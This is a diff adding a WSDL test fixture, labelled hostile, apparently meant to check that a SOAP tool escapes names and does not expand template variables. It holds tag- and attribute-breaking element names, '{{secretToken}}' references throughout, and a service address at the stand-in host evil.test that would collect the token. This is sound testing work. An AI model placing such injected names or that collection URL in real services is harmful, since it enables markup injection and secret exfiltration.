@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Hostile fixture: names that would break out of a tag, and "{{…}}" variable references planted
+     in every string that reaches an envelope, a comment, the SOAPAction or the address. -->
+<wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
+  xmlns:xs="http://www.w3.org/2001/XMLSchema"
+  xmlns:tns="urn:x:{{secretToken}}"
+  targetNamespace="urn:x:{{secretToken}}"
+  name="Injection">
+  <wsdl:types>
+    <xs:schema elementFormDefault="qualified" targetNamespace="urn:x:{{secretToken}}">
+      <xs:simpleType name="Kind">
+        <xs:restriction base="xs:string">
+          <xs:enumeration value="{{secretToken}}"/>
+          <xs:enumeration value="plain"/>
+        </xs:restriction>
+      </xs:simpleType>
+      <xs:element name="Send">
+        <xs:complexType>
+          <xs:sequence>
+            <xs:element name="z&gt;&lt;inj attr=&quot;{{secretToken}}&quot;/&gt;&lt;z" type="xs:string"/>
+            <xs:element name="kind" type="tns:Kind"/>
+            <xs:element name="ok" type="xs:string"/>
+          </xs:sequence>
+          <xs:attribute name="a&quot; b=&quot;{{secretToken}}" type="xs:string"/>
+        </xs:complexType>
+      </xs:element>
+    </xs:schema>
+  </wsdl:types>
+  <wsdl:message name="SendIn">
+    <wsdl:part name="parameters" element="tns:Send"/>
+  </wsdl:message>
+  <wsdl:message name="Bad&lt;Msg">
+    <wsdl:part name="p" type="xs:string"/>
+  </wsdl:message>
+  <wsdl:portType name="InjectionPortType">
+    <wsdl:operation name="Send">
+      <wsdl:input message="tns:SendIn"/>
+    </wsdl:operation>
+  </wsdl:portType>
+  <wsdl:binding name="InjectionBinding" type="tns:InjectionPortType">
+    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
+    <wsdl:operation name="Send">
+      <soap:operation soapAction="urn:{{secretToken}}" style="document"/>
+      <wsdl:input>
+        <soap:body use="literal"/>
+      </wsdl:input>
+    </wsdl:operation>
+  </wsdl:binding>
+  <wsdl:service name="Injection">
+    <wsdl:port name="InjectionPort" binding="tns:InjectionBinding">
+      <soap:address location="http://evil.test/collect?t={{secretToken}}"/>
+    </wsdl:port>
+  </wsdl:service>
+</wsdl:definitions>
